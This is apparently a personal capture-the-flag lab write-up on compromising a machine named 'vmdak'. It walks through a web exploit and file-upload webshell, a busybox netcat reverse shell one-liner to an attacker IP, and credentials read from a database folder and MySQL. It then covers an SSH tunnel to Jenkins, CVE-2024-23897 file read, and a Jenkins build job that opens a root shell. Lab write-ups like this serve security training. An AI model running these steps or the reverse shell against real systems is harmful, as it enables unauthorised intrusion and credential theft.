# vmdak

i start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

The port 9443 says it's http but there is a SSL problem so we need to add the domain in etc hosts and request the website using https and then we see this:

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

I look at some known exploits for this framework, click on admin dashboard and see this:

{% embed url="https://www.exploit-db.com/exploits/52017" %}

so i try it out:

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

and i manage to get in:

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

the box is very laggy and i have to wait 5min + for one request so i will come back later

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Ok so after looking for fast5 exploit me saw that this was called Prison Management System so i looked up known exploits that could lead to code execution and saw this article:

{% embed url="https://sploitus.com/exploit?id=PACKETSTORM:179737" %}

So i go and create a new user:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

and i capture the post request:

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

and we got ourselves a webshell:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

and we manage to get a reverse shell with a busybox nc command:

```
busybox nc 192.168.45.245 80 -e sh
```

I try plenty of privesc but don't find anything so i suppose i need to pivot to user vmdak and start looking for credentials and find something in the database folder:

<figure><img src="../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

```
root:sqlCr3ds3xp0seD
```

but it's not the password of root so i guess that i need to enumerate some sort of mysql service?

```
mysql -u root -p
```

and then we find this password:

<figure><img src="../../../.gitbook/assets/image (263).png" alt=""><figcaption><p>RonnyCache001</p></figcaption></figure>

The only user is vmdak and root so i'll try for those users:

<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

So it's the password of user vmdak, nice

ran some linpeas and pspy and found nothing but this seemed interesting:

<figure><img src="../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Ok so since i have ssh access to user vmdak i can redirect the jenkins server on my local port :

```
ssh -L 9999:127.0.0.1:8080 vmdak@192.168.212.103
```

So if i visit my [http://127.0.0.1:9999](http://127.0.0.1:9999) i'll see the jenkins server:

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

So i tried accessing this CLI but failed so i looked at some file read vulns for jenkins:&#x20;

{% embed url="https://medium.verylazytech.com/cve-2024-23897-jenkins-file-read-vulnerability-poc-6a1dfdbfd6f2" %}

<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

and i manage to connect:&#x20;

<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins" %}

So i create a random job that executes a reverse shell once it's build:

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

i save and build and get my shell:

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>
